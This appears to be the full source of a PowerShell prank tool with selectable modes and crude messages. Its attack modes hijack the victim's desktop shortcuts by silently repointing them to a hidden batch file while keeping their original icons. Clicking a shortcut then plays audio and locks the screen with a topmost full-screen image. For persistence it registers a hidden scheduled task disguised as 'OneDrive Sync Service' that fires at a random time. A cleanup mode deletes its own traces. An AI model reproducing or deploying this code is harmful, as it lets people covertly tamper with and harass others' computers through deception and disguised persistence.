# Selection mode

if ($args -contains "without_empathy") {
    Write-Host "without_empathy mode activated ! ima f*ck that sh*t up !!!"
    $mode="without_empathy"
} elseif ($args -contains "with_empathy") {
    Write-Host "with_empathy mode activated, because he probably stronger than you idk"
    $mode="with_empathy"
} elseif ($args -contains "save_him_from_hell") {
    Write-Host "At least you're alive bruh`ni hope it was worth it"
    $mode="save_him_from_hell"
} elseif ($args -contains "wtf_is_wrong_with_you") {
    Write-Host "yoooo wtf is wrong with you ?! you probably hate him right ??"
    $mode="wtf_is_wrong_with_you"
} elseif ($args -contains "ah_shit..._here_we_go_again") {
    $mode="ah_shit..._here_we_go_again"
} elseif ($args -contains "get_shrekt") {
    $mode="get_shrekt"
} else {
    Write-Host "wtf are you doing ? you just have to select a mode to use that sh*t"
    exit
}

if ($mode -notin @("save_him_from_hell", "ah_shit..._here_we_go_again", "get_shrekt")) {
    
    # Get the links on the Desktop (SAFE MODE)
    $links = @()
    $WshShell = New-Object -ComObject WScript.Shell

    $desktopPaths = @(
        "$env:USERPROFILE\Desktop",
        "$env:USERPROFILE\OneDrive\Desktop"
    )

    foreach ($path in $desktopPaths) {

        if (Test-Path $path) {

            Get-ChildItem "$path\*.lnk" -ErrorAction SilentlyContinue | ForEach-Object {

                try {
                    $shortcut = $WshShell.CreateShortcut($_.FullName)

                    # Ignore special shortcuts
                    if ([string]::IsNullOrWhiteSpace($shortcut.TargetPath)) { continue }
                    if ($shortcut.TargetPath -like "::{*}") { continue }
                    if ($shortcut.TargetPath -match "^shell:") { continue }
                    if ($shortcut.TargetPath -match "control.exe|explorer.exe") { continue }

                    $links += $_

                } catch {
                    continue
                }
            }

        }
    }

    # If we got at least one link...
    if($links.Count -ge 1){
        
        # Backup the links
        New-Item -ItemType Directory "$env:LOCALAPPDATA\Backup" -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "$env:LOCALAPPDATA\Backup" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

        $i=0

        foreach ($link in $links) {
            if (!(Test-Path "$env:LOCALAPPDATA\Backup\$i\$($link.Name)")) {
                New-Item -ItemType Directory "$env:LOCALAPPDATA\Backup\$i" -ErrorAction SilentlyContinue
                Copy-Item $link.FullName "$env:LOCALAPPDATA\Backup\$i" -ErrorAction SilentlyContinue
                "$i;$($link.FullName)" | Out-File -Append "$env:LOCALAPPDATA\Backup\links.db" -Encoding Default
                $i++
            }
        }

        # Install the script
        if (!(Test-Path "$env:LOCALAPPDATA\Data")) {
            New-Item -ItemType Directory "$env:LOCALAPPDATA\Data" -ErrorAction SilentlyContinue
            Set-ItemProperty -Path "$env:LOCALAPPDATA\Data" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
        }
        if (!(Test-Path "$env:LOCALAPPDATA\Data\image.png") -or !(Test-Path "$env:LOCALAPPDATA\Data\audio.wav")) {
            Expand-Archive -Path ".\src\data.zip" -DestinationPath "$env:LOCALAPPDATA\Data\"
        }
        if (!(Test-Path "$env:LOCALAPPDATA\Data\MEGA_links.ps1")) {
            Copy-Item ".\MEGA_links.ps1" "$env:LOCALAPPDATA\Data\"
        }
        if (!(Test-Path "$env:LOCALAPPDATA\Data\src\data.zip")) {
            New-Item -ItemType Directory "$env:LOCALAPPDATA\Data\src" -ErrorAction SilentlyContinue
            Copy-Item ".\src\data.zip" "$env:LOCALAPPDATA\Data\src"
        }
        if (!(Test-Path "$env:LOCALAPPDATA\Data\save_him_from_hell.bat")) {
            Copy-Item ".\save_him_from_hell.bat" "$env:LOCALAPPDATA\Data\"
        }

        # Setup the mode
        if ($mode -eq "without_empathy") {

@"
@echo off

Powershell "$env:LOCALAPPDATA\Data\MEGA_links.ps1" "save_him_from_hell"

Powershell "$env:LOCALAPPDATA\Data\MEGA_links.ps1" "get_shrekt"

"@ | Out-File "$env:LOCALAPPDATA\Data\run.bat" -Encoding ASCII

        }


        elseif ($mode -eq "with_empathy") {

@"
@echo off

Powershell "$env:LOCALAPPDATA\Data\MEGA_links.ps1" "save_him_from_hell"

"$env:LOCALAPPDATA\Data\image.png"

"@ | Out-File "$env:LOCALAPPDATA\Data\run.bat" -Encoding ASCII

        }


        elseif ($mode -eq "wtf_is_wrong_with_you") {

@"
@echo off

Powershell "$env:LOCALAPPDATA\Data\MEGA_links.ps1" "ah_shit..._here_we_go_again"

Powershell "$env:LOCALAPPDATA\Data\MEGA_links.ps1" "get_shrekt"

"@ | Out-File "$env:LOCALAPPDATA\Data\run.bat" -Encoding ASCII

        }


        # Change the links on the Desktop
        $WshShell = New-Object -ComObject WScript.Shell

        foreach ($link in $links) {
            $shortcut = $WshShell.CreateShortcut($link.FullName)

            # Sauvegarder l'icône d'origine avant modification
            $originalIconLocation = $shortcut.IconLocation
            
            $shortcut.TargetPath = "$env:LOCALAPPDATA\Data\run.bat"
            $shortcut.WindowStyle = 7
            
            # Réappliquer l'icône d'origine (si elle existe)
            if (![string]::IsNullOrWhiteSpace($originalIconLocation)) {
                $shortcut.IconLocation = $originalIconLocation
            }

            $shortcut.Save()

        }

    }

} elseif ($mode -eq "save_him_from_hell"){
    
    Start-Transcript "$env:LOCALAPPDATA\Backup\Data_Recovery.log" -Append

    Write-Host "--- Starting Restoration Procedure ---" -ForegroundColor Cyan

    # Loading the database
    $data = @{}
    if (Test-Path "$env:LOCALAPPDATA\Backup\links.db") {
        foreach ($raw in Get-Content "$env:LOCALAPPDATA\Backup\links.db") {
            $parts = $raw.Split(";",2)
            if ($parts.Count -eq 2) { $data[$parts[0]] = $parts[1] }
        }
        Write-Host "[OK] Database loaded." -ForegroundColor Green
    } else {
        Write-Host "[!] links.db missing : Skipping file restoration phase." -ForegroundColor Yellow
    }

    # Restoring files (only executes if $data contains something)
    if ($data.Count -gt 0) {
        foreach ($id in $data.Keys) {
            try {
                $sourceDir = "$env:LOCALAPPDATA\Backup\$id"
                if (Test-Path $sourceDir) {
                    $sourceFile = Get-ChildItem $sourceDir | Select-Object -First 1
                    if ($sourceFile) {
                        Move-Item $sourceFile.FullName $data[$id] -Force -ErrorAction Stop
                        Write-Host "[OK] Restored : $($data[$id])" -ForegroundColor Green
                    }
                }
            } catch {
                Write-Host "[ERROR] Failed to restore $id : $($_.Exception.Message)" -ForegroundColor Red
            }
        }
    }

    # Cleanup (Executes even if restoration failed)
    Write-Host "Cleaning up traces..." -ForegroundColor Yellow
    $toRemove = @(
        "$env:LOCALAPPDATA\Backup\links.db",
        "$env:LOCALAPPDATA\Data\src\data.zip",
        "$env:LOCALAPPDATA\Data\src"
    )
    foreach ($path in $toRemove) {
        if (Test-Path $path) { Remove-Item $path -Recurse -Force -ErrorAction SilentlyContinue }
    }

    # Cleaning up remaining ID folders
    if ($data.Count -gt 0) {
        foreach ($id in $data.Keys) {
            $idPath = "$env:LOCALAPPDATA\Backup\$id"
            if (Test-Path $idPath) {
                # On vérifie s'il y a des fichiers à l'intérieur
                $items = Get-ChildItem -Path $idPath
                if ($items.Count -eq 0) {
                    # Le dossier est vide, on peut supprimer sans crainte et sans popup
                    Remove-Item $idPath -Confirm:$false -ErrorAction SilentlyContinue
                    Write-Host "[OK] Backup folder removed : $id" -ForegroundColor Gray
                } else {
                    # Le dossier n'est pas vide, on affiche l'erreur sans appeler Remove-Item
                    Write-Host "[ERROR] Failed to delete $idPath : Folder not empty (restoration failed?)" -ForegroundColor Red
                }
            }
        }
    }

    # Scheduled task
    $taskName = "OneDrive Sync Service"
    if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
        Write-Host "[OK] Scheduled task removed." -ForegroundColor Green
    }

    # File self-destruction (via CMD to allow script time to finish)
    Write-Host "Deleting script files..." -ForegroundColor Yellow
    $filesToDelete = "audio.wav", "image.png", "run.bat", "MEGA_links.ps1", "save_him_from_hell.bat"
    foreach ($file in $filesToDelete) {
        Start-Process cmd.exe -ArgumentList "/c timeout 5 & del `"$env:LOCALAPPDATA\Data\$file`"" -WindowStyle Hidden
    }

    Write-Host "--- Procedure completed ---" -ForegroundColor Cyan

    Stop-Transcript

} elseif ($mode -eq "ah_shit..._here_we_go_again") {
    
    # Log the recovery (in case you get an error)
    Start-Transcript "$env:LOCALAPPDATA\Backup\Data_Recovery.log" -Append

    # Restore where the links were
    $data = @{}

    foreach ($raw in Get-Content "$env:LOCALAPPDATA\Backup\links.db") {
        $parts = $raw.Split(";",2)
        $data[$parts[0]] = $parts[1]
    }

    foreach ($id in $data.Keys) {
        Move-Item "$env:LOCALAPPDATA\Backup\$id\$(($data[$id]).Split("\")[-1])" $data[$id] -Force
    }

    Remove-Item "$env:LOCALAPPDATA\Backup\links.db"

    foreach ($id in $data.Keys){
        Remove-Item "$env:LOCALAPPDATA\Backup\$id"
    }

    # Stop logging
    Stop-Transcript

    # Get a random date/time
    $today = Get-Date
    $randomDays = Get-Random -Minimum 0 -Maximum 7
    $randomHour = Get-Random -Minimum 0 -Maximum 23
    $randomMinute = Get-Random -Minimum 0 -Maximum 59

    $randomDateTime = $today.AddDays($randomDays).Date.AddHours($randomHour).AddMinutes($randomMinute)

    # Set the name of the task
    $taskName = "OneDrive Sync Service"

    # Set the action of the task
    $action = New-ScheduledTaskAction `
        -Execute "powershell.exe" `
        -Argument "-NoProfile -WindowStyle Hidden -File `"$env:LOCALAPPDATA\Data\MEGA_links.ps1`" `"wtf_is_wrong_with_you`""

    # Set the date/time execution of the task
    $trigger = New-ScheduledTaskTrigger -Once -At $randomDateTime

    # Set the settings of the task
    $settings = New-ScheduledTaskSettingsSet `
        -Hidden `
        -StartWhenAvailable `
        -AllowStartIfOnBatteries `
        -DontStopIfGoingOnBatteries `
        -ExecutionTimeLimit (New-TimeSpan -Minutes 5) `
        -IdleDuration 30

    # If the task exist, delete it
    if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
    }

    # And save the new task
    Register-ScheduledTask `
        -TaskName $taskName `
        -Action $action `
        -Trigger $trigger `
        -Settings $settings `
        -Force


} elseif ($mode -eq "get_shrekt") {
    
    # -------------------------
    # AUDIO (in RAM)
    # -------------------------
    $audioPath = "$env:LOCALAPPDATA\Data\audio.wav"

    $player = New-Object System.Media.SoundPlayer
    $player.SoundLocation = $audioPath
    $player.Load()
    $player.Play()

    # -------------------------
    # IMAGE (in RAM)
    # -------------------------
    Add-Type -AssemblyName PresentationFramework

    $imagePath = "$env:LOCALAPPDATA\Data\image.png"
    
    $bytes  = [System.IO.File]::ReadAllBytes($imagePath)
    $stream = New-Object System.IO.MemoryStream(,$bytes)

    $bitmap = New-Object Windows.Media.Imaging.BitmapImage
    $bitmap.BeginInit()
    $bitmap.StreamSource = $stream
    $bitmap.CacheOption  = [Windows.Media.Imaging.BitmapCacheOption]::OnLoad
    $bitmap.EndInit()
    $bitmap.Freeze()

    # -------------------------
    # WINDOW
    # -------------------------
    $window = New-Object Windows.Window
    $window.WindowStyle = 'None'
    $window.WindowState = 'Maximized'
    $window.Topmost = $true
    $window.Background = 'Black'

    $image = New-Object Windows.Controls.Image
    $image.Source = $bitmap
    $image.Stretch = 'Uniform'

    $window.Content = $image

    $window.ShowDialog()
}
